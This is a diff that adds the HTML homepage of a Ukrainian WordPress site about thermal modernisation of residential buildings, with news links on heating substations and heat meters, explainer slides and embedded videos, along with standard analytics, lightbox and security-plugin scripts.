@@ -1,0 +1,787 @@
+ 
+<!doctype html>
+<html height="100%;">
+<head>
+<meta charset="UTF-8" />
+<title>Термомодернізація житлового будинку</title>
+<link href="http://thermomodernisation.org/wp-content/themes/damfos/favicon.ico" rel="shortcut icon">
+<link rel="stylesheet" href="http://thermomodernisation.org/wp-content/themes/damfos/style.css" type="text/css">
+<link rel="stylesheet" href="http://thermomodernisation.org/wp-content/themes/damfos/css/bootstrap.css" type="text/css" />
+<link rel="stylesheet" href="http://thermomodernisation.org/wp-content/themes/damfos/css/jquery.bxslider.css" type="text/css" />
+<link rel="stylesheet" href="http://thermomodernisation.org/wp-content/themes/damfos/css/styles.css" type="text/css" />
+<link rel="stylesheet" href="http://thermomodernisation.org/wp-content/themes/damfos/css/responsive.css" type="text/css" />
+
+	<style type="text/css">
+		#fancybox-close{right:-15px;top:-15px}
+		div#fancybox-content{border-color:#FFFFFF}
+		div#fancybox-title{background-color:#FFFFFF}
+		div#fancybox-outer{background-color:#FFFFFF}
+		div#fancybox-title-inside{color:#333333}
+	</style>
+
+	<link rel="alternate" type="application/rss+xml" title="Термомодернізація житлового будинку &raquo; стрічка" href="http://thermomodernisation.org/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Термомодернізація житлового будинку &raquo; Канал коментарів" href="http://thermomodernisation.org/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Термомодернізація житлового будинку &raquo; Про Проект Канал коментарів" href="http://thermomodernisation.org/o-proekte/feed/" />
+<meta property="og:image" content="http://thermomodernisation.org/wp-content/themes/damfos/images/logo.png"/>		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/thermomodernisation.org\/wp-includes\/js\/wp-emoji-release.min.js?ver=053d2c64d1001548f9c38f0a7a207308"}};
+			!function(a,b,c){function d(a){var c,d=b.createElement("canvas"),e=d.getContext&&d.getContext("2d"),f=String.fromCharCode;return e&&e.fillText?(e.textBaseline="top",e.font="600 32px Arial","flag"===a?(e.fillText(f(55356,56806,55356,56826),0,0),d.toDataURL().length>3e3):"diversity"===a?(e.fillText(f(55356,57221),0,0),c=e.getImageData(16,16,1,1).data.toString(),e.fillText(f(55356,57221,55356,57343),0,0),c!==e.getImageData(16,16,1,1).data.toString()):("simple"===a?e.fillText(f(55357,56835),0,0):e.fillText(f(55356,57135),0,0),0!==e.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='contact-form-7-css'  href='http://thermomodernisation.org/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.3.1' type='text/css' media='all' />
+<link rel='stylesheet' id='fancybox-css'  href='http://thermomodernisation.org/wp-content/plugins/fancybox-for-wordpress/fancybox/fancybox.css?ver=053d2c64d1001548f9c38f0a7a207308' type='text/css' media='all' />
+<script type='text/javascript' src='http://thermomodernisation.org/wp-includes/js/jquery/jquery.js?ver=1.11.3'></script>
+<script type='text/javascript' src='http://thermomodernisation.org/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://thermomodernisation.org/wp-content/plugins/fancybox-for-wordpress/fancybox/jquery.fancybox.js?ver=1.3.4'></script>
+<link rel='https://api.w.org/' href='http://thermomodernisation.org/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://thermomodernisation.org/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://thermomodernisation.org/wp-includes/wlwmanifest.xml" /> 
+
+<link rel="canonical" href="http://thermomodernisation.org/" />
+<link rel='shortlink' href='http://thermomodernisation.org/' />
+
+<!-- Fancybox for WordPress -->
+<script type="text/javascript">
+jQuery(function(){
+
+jQuery.fn.getTitle = function() { // Copy the title of every IMG tag and add it to its parent A so that fancybox can show titles
+	var arr = jQuery("a.fancybox");
+	jQuery.each(arr, function() {
+		var title = jQuery(this).children("img").attr("title");
+		jQuery(this).attr('title',title);
+	})
+}
+
+// Supported file extensions
+var thumbnails = jQuery("a:has(img)").not(".nolightbox").filter( function() { return /\.(jpe?g|png|gif|bmp)$/i.test(jQuery(this).attr('href')) });
+
+thumbnails.addClass("fancybox").attr("rel","fancybox").getTitle();
+jQuery("a.fancybox").fancybox({
+	'cyclic': false,
+	'autoScale': true,
+	'padding': 10,
+	'opacity': true,
+	'speedIn': 500,
+	'speedOut': 500,
+	'changeSpeed': 300,
+	'overlayShow': true,
+	'overlayOpacity': "0.3",
+	'overlayColor': "#666666",
+	'titleShow': true,
+	'titlePosition': 'inside',
+	'enableEscapeButton': true,
+	'showCloseButton': true,
+	'showNavArrows': true,
+	'hideOnOverlayClick': true,
+	'hideOnContentClick': false,
+	'width': 560,
+	'height': 340,
+	'transitionIn': "fade",
+	'transitionOut': "fade",
+	'centerOnScroll': true
+});
+
+
+})
+</script>
+<!-- END Fancybox for WordPress -->
+<script type="text/javascript">
+(function(url){
+	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
+	var addEvent = function(evt, handler) {
+		if (window.addEventListener) {
+			document.addEventListener(evt, handler, false);
+		} else if (window.attachEvent) {
+			document.attachEvent('on' + evt, handler);
+		}
+	};
+	var removeEvent = function(evt, handler) {
+		if (window.removeEventListener) {
+			document.removeEventListener(evt, handler, false);
+		} else if (window.detachEvent) {
+			document.detachEvent('on' + evt, handler);
+		}
+	};
+	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+	var logHuman = function() {
+		var wfscr = document.createElement('script');
+		wfscr.type = 'text/javascript';
+		wfscr.async = true;
+		wfscr.src = url + '&r=' + Math.random();
+		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
+		for (var i = 0; i < evts.length; i++) {
+			removeEvent(evts[i], logHuman);
+		}
+	};
+	for (var i = 0; i < evts.length; i++) {
+		addEvent(evts[i], logHuman);
+	}
+})('//thermomodernisation.org/?wordfence_logHuman=1&hid=E7C1824613FF694F479CBDCD3F921EE8');
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-67803632-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
+<meta name="yandex-verification" content="07dec9a8d77653a9" />
+</head>
+
+
+
+<body class="home page page-id-12 page-template-default">
+
+
+
+	<div class="header-menu mobile-header-menu nav-panel-hide">
+		<span class="nav-panel-close">X</span>
+		<div class="menu-menyu-container"><ul id="menu-menyu" class="topnav"><li id="menu-item-46" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-46"><a href="http://thermomodernisation.org/category/novyny/">Новини</a></li>
+<li id="menu-item-44" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-44"><a href="http://thermomodernisation.org/category/video/">Відео</a>
+<ul class="sub-menu">
+	<li id="menu-item-451" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-451"><a href="http://thermomodernisation.org/category/video/intervyu/">Інтерв&#8217;ю</a></li>
+	<li id="menu-item-130" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="http://thermomodernisation.org/category/video/specializovani-vypusky/">Спеціалізовані Випуски</a></li>
+	<li id="menu-item-128" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-128"><a href="http://thermomodernisation.org/category/video/konferentsii-ta-kruglyi-stolyi/">Конференції та круглі столи</a></li>
+	<li id="menu-item-129" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-129"><a href="http://thermomodernisation.org/category/video/technichna-informatsiya/">Технічна інформація</a></li>
+</ul>
+</li>
+<li id="menu-item-49" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-49"><a href="http://thermomodernisation.org/category/proekty/">Проекти</a></li>
+<li id="menu-item-47" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-47"><a href="http://thermomodernisation.org/category/partnery/">Партнери</a></li>
+<li id="menu-item-286" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-286"><a href="http://thermomodernisation.org/pro-proekt/">Про проект</a></li>
+</ul></div>	</div>
+
+
+
+	<div class="container">
+		<div class="row header">
+			<div class="left header-left">
+				<div class="header-row header-row1">
+
+							<div class="left social">
+<!--						<ul>
+							<li class="soc-fb"><a href="#"></a></li>
+						<li class="soc-tw"><a href="#"></a></li>
+							<li class="soc-gp"><a href="#"></a></li>
+						</ul>
+-->
+					</div>
+
+					<div><div class="page-shares">
+	<div style="position: relative;">
+	<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-53184379511f241f"></script>
+	<script type="text/javascript">
+	var addthis_config = {
+	data_track_address_bar: false,
+	data_track_clickback: false
+	};
+	</script></div>
+					<div class="right callback"><a href="/zvorotniy-zv-yazok/">Зворотній зв’язок</a></div>
+					<!--<div class="right langs">
+						<ul>
+							<li><a href="#">рус</a></li>
+							<li class="active"><a href="#">укр</a></li>
+						</ul>
+					</div>-->
+					<div class="clr"></div>
+				</div>
+
+				<a class="logo mobile" href="/termomodernizatsiya-vid-a-do-ya/">
+					<img src="http://thermomodernisation.org/wp-content/themes/damfos/images/logo.png" alt="" />
+					<span>Термомодернізація <br /> <strong>житлового будинку</strong></span>
+				</a>
+
+				<ul class="menu-mobile"><li><a href="javascript:void();"><span class="menu-mobile-icon"></span><span class="menu-mobile-title">Меню</span></a></li></ul>
+
+				<div class="header-row header-row2">
+					<a href="/" class="left header-main">Головна</a>
+	</div>
+				
+</div>
+				<!--	<a href="/termomodernizatsiya-vid-a-do-ya/" class="left modern-ay">Термомодернізація від А до Я</a>  -->
+					<div class="right header-search">				
+						<form name="search" action="http://thermomodernisation.org/" method="get" class="search-form">
+							<input type="text" value="" name="s" placeholder="" class="inputbox">
+							<button type="submit" class="button">GO</button>
+						</form>
+					</div>
+					<div class="clr"></div>
+				</div>
+				<div class="header-menu"><div class="menu-menyu-container"><ul id="menu-menyu-1" class="topnav"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-46"><a href="http://thermomodernisation.org/category/novyny/">Новини</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-44"><a href="http://thermomodernisation.org/category/video/">Відео</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-451"><a href="http://thermomodernisation.org/category/video/intervyu/">Інтерв&#8217;ю</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="http://thermomodernisation.org/category/video/specializovani-vypusky/">Спеціалізовані Випуски</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-128"><a href="http://thermomodernisation.org/category/video/konferentsii-ta-kruglyi-stolyi/">Конференції та круглі столи</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-129"><a href="http://thermomodernisation.org/category/video/technichna-informatsiya/">Технічна інформація</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-49"><a href="http://thermomodernisation.org/category/proekty/">Проекти</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-47"><a href="http://thermomodernisation.org/category/partnery/">Партнери</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-286"><a href="http://thermomodernisation.org/pro-proekt/">Про проект</a></li>
+</ul></div></div>
+			</div>
+
+			<div class="right logo">
+				<a class="logo" href="/">
+					<img src="http://thermomodernisation.org/wp-content/themes/damfos/images/logo.png" alt="" />
+					<span>Термомодернізація<br /> <strong>житлового будинку</strong></span>
+				</a>
+			</div>
+			<div class="clr"></div>
+		</div>
+
+
+		
+
+
+				<div class="row slider">
+			<ul>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p><strong>Для чого потрібна</strong> термомодернізація?</p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/1-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Для чого потрібна термомодернізація?" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/1-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/1-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/1-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/1-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p><strong>Що таке</strong> термомодернізація?</p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/2-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Що таке термомодернізація?" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/2-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/2-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/2-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/2-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p><strong>Основні етапи</strong> термомодернізації</p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/3-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Основні етапи термомодернізації" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/3-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/3-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/3-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/3-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p>Що включає в себе <strong>регулювання</strong>?</p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/4-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Що включає в себе регулювання?" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/4-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/4-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/4-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/4-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p>Регулювання будинку &#8211; <strong>тепловий пункт</strong></p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/5-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Регулювання будинку - тепловий пункт" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/5-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/5-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/5-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/5-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p>Регулювання будинку &#8211; <strong>балансувальні клапани</strong></p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/6-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Регулювання будинку - балансувальні клапани" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/6-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/6-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/6-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/6-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p>Регулювання будинку &#8211; <strong>радіаторні терморегулятори</strong></p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/7-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Регулювання будинку - радіаторні терморегулятори" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/7-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/7-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/7-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/7-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p><strong>Де взяти гроші </strong>на проведення термомодернізації?</p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/8-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Де взяти гроші на проведення термомодернізації?" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/8-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/8-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/8-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/8-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+								<li>
+					<div class="slider-cont">
+						<div class="slider-text">
+							<p>Що таке <strong>Урядова програма</strong>?</p>
+						</div>
+					</div>
+					<img width="2000" height="732" src="http://thermomodernisation.org/wp-content/uploads/2015/10/9-page.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Що таке Урядова програма?" srcset="http://thermomodernisation.org/wp-content/uploads/2015/10/9-page-300x110.png 300w, http://thermomodernisation.org/wp-content/uploads/2015/10/9-page-1024x375.png 1024w, http://thermomodernisation.org/wp-content/uploads/2015/10/9-page-624x228.png 624w, http://thermomodernisation.org/wp-content/uploads/2015/10/9-page.png 2000w" sizes="(max-width: 2000px) 100vw, 2000px" />				</li>
+							</ul>
+		</div>
+		
+
+
+
+
+
+		<div class="row site-body">
+			<div class="left site-body-left">
+				<div class="box box-main-cats">
+										<div class="left box-main-cats-left">
+												<a href="http://thermomodernisation.org/novyny/statti/individualniy-teploviy-punkt-dlya-osbb-poradi-fahivtsya-2/" class="bigarticle-img">
+							<span><img width="725" height="411" src="http://thermomodernisation.org/wp-content/uploads/2017/07/Snimok-e`krana-2017-07-18-v-14.29.16.png" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Снимок экрана 2017-07-18 в 14.29.16" srcset="http://thermomodernisation.org/wp-content/uploads/2017/07/Snimok-e`krana-2017-07-18-v-14.29.16-300x170.png 300w, http://thermomodernisation.org/wp-content/uploads/2017/07/Snimok-e`krana-2017-07-18-v-14.29.16-624x354.png 624w, http://thermomodernisation.org/wp-content/uploads/2017/07/Snimok-e`krana-2017-07-18-v-14.29.16.png 725w" sizes="(max-width: 725px) 100vw, 725px" /></span>
+						</a>
+						<div class="bigarticle-box">
+							<a href="http://thermomodernisation.org/novyny/statti/individualniy-teploviy-punkt-dlya-osbb-poradi-fahivtsya-2/" class="bigarticle-title">Індивідуальний тепловий пункт для ОСББ: поради фахівця</a>
+							<a href="http://thermomodernisation.org/novyny/statti/individualniy-teploviy-punkt-dlya-osbb-poradi-fahivtsya-2/" class="more">детальніше</a>
+							<div class="moreinfo">
+								<div class="left article-views">7</div>
+								<div class="left article-date">18.07.2017</div>
+								<div class="clr"></div>
+							</div>
+						</div>
+											</div>
+					
+
+
+
+
+										<div class="right box-main-cats-right">
+						<div class="title"><h2>Новини</h2><span><a href="/novosti-i-stati/">переглянути все</a></span></div>
+						<ul class="smallcategory-list">
+														<li>
+								<a href="http://thermomodernisation.org/novyny/novosti/praktikum_opalennya-yaki-problemi-virishuye-i-yaki-ne-virishuye-teploviy-lichilnik-v-budinku/" class="smallarticle-img">
+									<span><img width="350" height="350" src="http://thermomodernisation.org/wp-content/uploads/2017/07/Energy-meters_sonometer1100.jpg" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Energy-meters_sonometer1100" srcset="http://thermomodernisation.org/wp-content/uploads/2017/07/Energy-meters_sonometer1100-150x150.jpg 150w, http://thermomodernisation.org/wp-content/uploads/2017/07/Energy-meters_sonometer1100-300x300.jpg 300w, http://thermomodernisation.org/wp-content/uploads/2017/07/Energy-meters_sonometer1100.jpg 350w" sizes="(max-width: 350px) 100vw, 350px" /></span>
+								</a>
+								<div class="smallarticle-box">
+									<a href="http://thermomodernisation.org/novyny/novosti/praktikum_opalennya-yaki-problemi-virishuye-i-yaki-ne-virishuye-teploviy-lichilnik-v-budinku/" class="smallarticle-title">#практикум_опалення: Які проблеми вирішує – і які не вирішує – тепловий лічильник в будинку</a>
+									<div class="moreinfo">
+										<div class="left article-views">15</div>
+										<div class="left article-date">04.07.2017</div>
+										<div class="clr"></div>
+									</div>
+									<a href="http://thermomodernisation.org/novyny/novosti/praktikum_opalennya-yaki-problemi-virishuye-i-yaki-ne-virishuye-teploviy-lichilnik-v-budinku/" class="more">детальніше</a>
+								</div>
+							</li>
+														<li>
+								<a href="http://thermomodernisation.org/novyny/statti/praktikum_opalennya-chi-dozvolit-modernizatsiya-gidroelevatora-navesti-lad-z-teplopostachannyam/" class="smallarticle-img">
+									<span><img width="350" height="350" src="http://thermomodernisation.org/wp-content/uploads/2017/07/hidroelevator.jpg" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="hidroelevator" srcset="http://thermomodernisation.org/wp-content/uploads/2017/07/hidroelevator-150x150.jpg 150w, http://thermomodernisation.org/wp-content/uploads/2017/07/hidroelevator-300x300.jpg 300w, http://thermomodernisation.org/wp-content/uploads/2017/07/hidroelevator.jpg 350w" sizes="(max-width: 350px) 100vw, 350px" /></span>
+								</a>
+								<div class="smallarticle-box">
+									<a href="http://thermomodernisation.org/novyny/statti/praktikum_opalennya-chi-dozvolit-modernizatsiya-gidroelevatora-navesti-lad-z-teplopostachannyam/" class="smallarticle-title">#практикум_опалення: Чи дозволить модернізація гідроелеватора навести лад з теплопостачанням?</a>
+									<div class="moreinfo">
+										<div class="left article-views">10</div>
+										<div class="left article-date">04.07.2017</div>
+										<div class="clr"></div>
+									</div>
+									<a href="http://thermomodernisation.org/novyny/statti/praktikum_opalennya-chi-dozvolit-modernizatsiya-gidroelevatora-navesti-lad-z-teplopostachannyam/" class="more">детальніше</a>
+								</div>
+							</li>
+														<li>
+								<a href="http://thermomodernisation.org/novyny/statti/otkaz-ot-tsentralizovannogo-otopleniya-reshenie-problemyi-ili-problemnoe-reshenie/" class="smallarticle-img">
+									<span><img width="300" height="168" src="http://thermomodernisation.org/wp-content/uploads/2017/03/Vadim-Aldoshin.jpeg" class="attachment-single-post-thumbnail size-single-post-thumbnail wp-post-image" alt="Вадим Алдошин" /></span>
+								</a>
+								<div class="smallarticle-box">
+									<a href="http://thermomodernisation.org/novyny/statti/otkaz-ot-tsentralizovannogo-otopleniya-reshenie-problemyi-ili-problemnoe-reshenie/" class="smallarticle-title">Отказ от централизованного отопления &#8211; решение проблемы или проблемное решение?</a>
+									<div class="moreinfo">
+										<div class="left article-views">1,566</div>
+										<div class="left article-date">14.03.2017</div>
+										<div class="clr"></div>
+									</div>
+									<a href="http://thermomodernisation.org/novyny/statti/otkaz-ot-tsentralizovannogo-otopleniya-reshenie-problemyi-ili-problemnoe-reshenie/" class="more">детальніше</a>
+								</div>
+							</li>
+													</ul>
+						<ul class="smallcategory-morelinks">
+							<!-- <a href="/category/novosti-i-stati/stati/" class="left sm-more1">Усі статті</a> -->
+							<a href="/category/novosti-i-stati/novosti/" class="left sm-more2">Усі новини</a>
+							<!-- <a href="/pidpyska/" class="right sm-subscrb">Підписатися</a> -->
+						</ul>
+					</div>
+										<div class="clr"></div>
+				</div>
+
+
+								<div class="videos-slider">
+					<div class="box">
+						<div class="title title-red"><h3>Відео</h3></div>
+						<div class="inbox">
+							<ul>
+																<li class="project">
+									<div class="vslider-video"><p><iframe src="http://youtube.com/embed/gddvDyYwo7c" width="240" height="180" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
+</div>
+									<div class="project-box">
+										<a href="http://thermomodernisation.org/video/ekonomiya-na-opalenni-shho-potribno-znati-pro-individualniy-teploviy-punkt-2/" class="project-title">Економія на опаленні: що потрібно знати про індивідуальний тепловий пункт</a>
+										<div class="moreinfo">
+											<div class="left article-views">66</div>
+											<div class="left article-date">09.03.2017</div>
+											<a href="http://thermomodernisation.org/video/ekonomiya-na-opalenni-shho-potribno-znati-pro-individualniy-teploviy-punkt-2/" class="right article-more"></a>
+											<div class="clr"></div>
+										</div>
+									</div>
+								</li>
+																<li class="project">
+									<div class="vslider-video"><p><iframe src="http://youtube.com/embed/jcOA3gve6H8" width="240" height="180" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
+</div>
+									<div class="project-box">
+										<a href="http://thermomodernisation.org/video/vse-shho-potribno-znati-pro-individualniy-teploviy-punkt-2/" class="project-title">Все, що потрібно знати про індивідуальний тепловий пункт</a>
+										<div class="moreinfo">
+											<div class="left article-views">73</div>
+											<div class="left article-date">09.03.2017</div>
+											<a href="http://thermomodernisation.org/video/vse-shho-potribno-znati-pro-individualniy-teploviy-punkt-2/" class="right article-more"></a>
+											<div class="clr"></div>
+										</div>
+									</div>
+								</li>
+																<li class="project">
+									<div class="vslider-video"><p><iframe src="http://youtube.com/embed/j0-ls5CLxkU" width="240" height="180" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
+</div>
+									<div class="project-box">
+										<a href="http://thermomodernisation.org/video/komentar-viktora-pirkova-do-dbn-v-2-6-31-2016-teplova-izolyatsiya-budivel/" class="project-title">Коментар Віктора Пиркова до ДБН В.2.6-31:2016 &#8220;Теплова ізоляція будівель&#8221;</a>
+										<div class="moreinfo">
+											<div class="left article-views">84</div>
+											<div class="left article-date">30.01.2017</div>
+											<a href="http://thermomodernisation.org/video/komentar-viktora-pirkova-do-dbn-v-2-6-31-2016-teplova-izolyatsiya-budivel/" class="right article-more"></a>
+											<div class="clr"></div>
+										</div>
+									</div>
+								</li>
+																<li class="project">
+									<div class="vslider-video"><p><iframe src="http://youtube.com/embed/rmKf5AOUH-k" width="240" height="180" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
+</div>
+									<div class="project-box">
+										<a href="http://thermomodernisation.org/video/termomodernizatsiya-5-ti-poverhovogo-budinku-v-lutsku/" class="project-title">Термомодернізація 5-ти поверхового будинку в Луцьку</a>
+										<div class="moreinfo">
+											<div class="left article-views">68</div>
+											<div class="left article-date">18.01.2017</div>
+											<a href="http://thermomodernisation.org/video/termomodernizatsiya-5-ti-poverhovogo-budinku-v-lutsku/" class="right article-more"></a>
+											<div class="clr"></div>
+										</div>
+									</div>
+								</li>
+																<li class="project">
+									<div class="vslider-video"><p><iframe src="http://youtube.com/embed/scvK5nCVVSA" width="240" height="180" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
+</div>
+									<div class="project-box">
+										<a href="http://thermomodernisation.org/video/dosvid-termomodernizatsiyi-lutsk-vul-nila-hasevicha-6/" class="project-title">Досвід термомодернізації: Луцьк, вул. Ніла Хасевича, 6</a>
+										<div class="moreinfo">
+											<div class="left article-views">90</div>
+											<div class="left article-date">24.10.2016</div>
+											<a href="http://thermomodernisation.org/video/dosvid-termomodernizatsiyi-lutsk-vul-nila-hasevicha-6/" class="right article-more"></a>
+											<div class="clr"></div>
+										</div>
+									</div>
+								</li>
+																<li class="project">
+									<div class="vslider-video"><p><iframe src="http://youtube.com/embed/A9SwZmdpfzI" width="240" height="180" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
+</div>
+									<div class="project-box">
+										<a href="http://thermomodernisation.org/video/termomodernizatsiya-zhitlovogo-budinku-kroki/" class="project-title">Термомодернізація житлового будинку &#8211; кроки</a>
+										<div class="moreinfo">
+											<div class="left article-views">95</div>
